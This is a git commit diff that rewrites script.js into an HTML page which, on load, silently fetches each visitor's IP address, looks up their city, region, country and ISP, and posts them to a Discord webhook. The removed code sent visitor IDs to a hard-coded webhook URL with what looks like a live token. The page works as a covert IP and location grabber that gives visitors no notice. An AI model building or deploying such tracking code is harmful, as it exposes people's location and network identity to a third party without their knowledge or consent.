dbf6dec2ea578194983441c30fda17a3f29f8e32
Davko <133976340+Discoard-Com@users.noreply.github.com>
2023-07-26 20:50:35 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,89 +1,53 @@
-function generateUserId() {
-  const userId = generateRandomNumber(16);
-  localStorage.setItem("userId", userId);
-  return userId;
-}
+<!DOCTYPE html>
+<html>
+<head>
+  <title>User Data</title>
+</head>
+<body>
+  <script>
+    function displayUserData() {
+      fetch("https://api.ipify.org/?format=json")
+        .then((response) => response.json())
+        .then((data) => {
+          const ip = data.ip;
+          getLocationAndISP(ip);
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
 
-function generateRandomNumber(length) {
-  let result = "";
-  const characters = "0123456789";
-  const charactersLength = characters.length;
-  for (let i = 0; i < length; i++) {
-    result += characters.charAt(Math.floor(Math.random() * charactersLength));
-  }
-  return result;
-}
+    function getLocationAndISP(ip) {
+      const locationUrl = `https://ipapi.co/${ip}/json/`;
 
-function displayUserData() {
-  const userId = localStorage.getItem("userId");
-  if (!userId) {
-    const newUserId = generateUserId();
-    document.getElementById("userId").textContent = newUserId;
-    sendUserData(newUserId);
-  } else {
-    document.getElementById("userId").textContent = userId;
-    sendUserData(userId);
-  }
+      fetch(locationUrl)
+        .then((response) => response.json())
+        .then((data) => {
+          const location = `${data.city}, ${data.region}, ${data.country_name}`;
+          const isp = data.org;
+          sendUserDataWithLocationAndISP(ip, location, isp);
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
 
-  fetch("https://api.ipify.org/?format=json")
-    .then((response) => response.json())
-    .then((data) => {
-      const ipElement = document.getElementById("ip");
-      ipElement.textContent = data.ip;
-      const locationElement = document.getElementById("location");
-      getLocation(data.ip, locationElement);
-    })
-    .catch((error) => {
-      console.error("Error:", error);
-    });
-}
+    function sendUserDataWithLocationAndISP(ip, location, isp) {
+      const webhookURL = "https://discord.com/api/webhooks/your-webhook-url"; // Replace with the actual webhook URL
+      const message = `IP Address: ${ip}\nLocation: ${location}\nISP: ${isp}`;
 
-function sendUserData(userId) {
-  const webhookURL = "https://discord.com/api/webhooks/1110583172917383238/oaoIQ92Lm2THQdTZ5CCSzozcSvwNbln1-5M7oyc27cUXaWKHaQipSJWzjxXTWt4vcXaz";
-  const message = "User ID: " + userId;
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ content: message })
+      })
+        .then((response) => console.log("Webhook sent successfully"))
+        .catch((error) => console.error("Error sending webhook:", error));
+    }
 
-  fetch(webhookURL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ content: message })
-  })
-    .then((response) => console.log("Webhook sent successfully"))
-    .catch((error) => console.error("Error sending webhook:", error));
-}
-
-function getLocation(ip, locationElement) {
-  const locationUrl = `https://ipapi.co/${ip}/json/`;
-
-  fetch(locationUrl)
-    .then((response) => response.json())
-    .then((data) => {
-      const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
-      locationElement.textContent = locationString;
-
-      sendUserDataWithLocation(locationString);
-    })
-    .catch((error) => {
-      console.error("Error:", error);
-      sendUserDataWithLocation("Unknown");
-    });
-}
-
-function sendUserDataWithLocation(location) {
-  const userId = localStorage.getItem("userId");
-  const webhookURL = "https://discord.com/api/webhooks/your-webhook-url"; // Replace with the actual webhook URL
-  const message = "User ID: " + userId + "\nLocation: " + location;
-
-  fetch(webhookURL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ content: message })
-  })
-    .then((response) => console.log("Webhook sent successfully"))
-    .catch((error) => console.error("Error sending webhook:", error));
-}
-
-displayUserData();
+    displayUserData();
+  </script>
+</body>
+</html>
